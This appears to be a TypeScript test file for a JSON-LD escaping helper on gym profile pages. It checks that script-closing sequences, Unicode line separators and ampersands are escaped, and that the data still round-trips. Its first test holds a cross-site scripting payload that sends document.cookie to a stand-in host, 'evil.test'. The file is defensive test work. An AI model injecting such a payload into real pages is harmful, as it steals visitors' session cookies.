/**
 * `toJsonLd` — the escaping that stops a gym description closing our `<script>` tag.
 *
 * The first test is the whole reason the module exists. It uses the actual payload an attacker
 * would type into a gym profile, because a test with `'<'` in it proves the replace runs and a
 * test with `'</script>'` in it proves the page survives.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { toJsonLd } from '../src/features/gym-detail/json-ld.ts';

test('a script-closing sequence in gym-supplied text cannot escape the script element', () => {
  const hostile = '</script><script>fetch("https://evil.test/?c="+document.cookie)</script>';

  const serialised = toJsonLd({ '@type': 'ExerciseGym', description: hostile });

  // The literal test: nothing an HTML parser reads as a closing tag survives.
  assert.ok(
    !serialised.includes('</script'),
    'the payload still contains a closing script tag — the page is injectable',
  );
  assert.ok(!serialised.includes('<'), 'an unescaped `<` remains');
  assert.ok(!serialised.includes('>'), 'an unescaped `>` remains');

  // And the part that makes the escaping acceptable rather than merely safe: a JSON parser — which
  // is what every search engine uses on this element — reads back exactly what the gym typed.
  const parsed: unknown = JSON.parse(serialised);
  assert.deepEqual(parsed, { '@type': 'ExerciseGym', description: hostile });
});

test('JSON.stringify alone would NOT have been enough — the premise, asserted', () => {
  // If this ever fails, `JSON.stringify` has started escaping `<` and this module is redundant.
  // Asserting the premise is what stops the module being deleted as paranoia in three years.
  assert.ok(JSON.stringify({ a: '</script>' }).includes('</script>'));
});

test('the two line separators are escaped, because they are legal JSON and illegal JavaScript', () => {
  const lineSeparator = String.fromCharCode(0x2028);
  const paragraphSeparator = String.fromCharCode(0x2029);

  const serialised = toJsonLd({ about: `a${lineSeparator}b${paragraphSeparator}c` });

  assert.ok(!serialised.includes(lineSeparator), 'a raw U+2028 survived');
  assert.ok(!serialised.includes(paragraphSeparator), 'a raw U+2029 survived');
  // `includes` with an explicit two-character prefix rather than a regex: `/\u2028/` in a regex
  // literal IS the character, not the escape sequence, so the assertion would silently test the
  // opposite of what it reads as \u2014 and pass for the wrong reason on the day the escaping breaks.
  const backslash = String.fromCharCode(0x5c);
  assert.ok(serialised.includes(`${backslash}u2028`), 'U+2028 was removed rather than escaped');
  assert.ok(serialised.includes(`${backslash}u2029`), 'U+2029 was removed rather than escaped');
  // Still round-trips: the escape is a JSON escape, not a deletion.
  assert.deepEqual(JSON.parse(serialised), { about: `a${lineSeparator}b${paragraphSeparator}c` });
});

test('ordinary punctuation is left alone, so a real description is not corrupted', () => {
  // "6<8 members per class" is a sentence a gym owner would plausibly write. It must round-trip,
  // not be stripped — the fix for an injection must not silently edit legitimate copy.
  const legitimate = 'Small groups: 6<8 members per class. Towels & water included.';

  const parsed: unknown = JSON.parse(toJsonLd({ about: legitimate }));

  assert.deepEqual(parsed, { about: legitimate });
});

test('an ampersand is escaped too, so a decoded entity cannot be re-interpreted', () => {
  const serialised = toJsonLd({ name: 'Towels & Weights' });

  assert.ok(!serialised.includes('&'), 'an unescaped `&` remains');
  assert.deepEqual(JSON.parse(serialised), { name: 'Towels & Weights' });
});
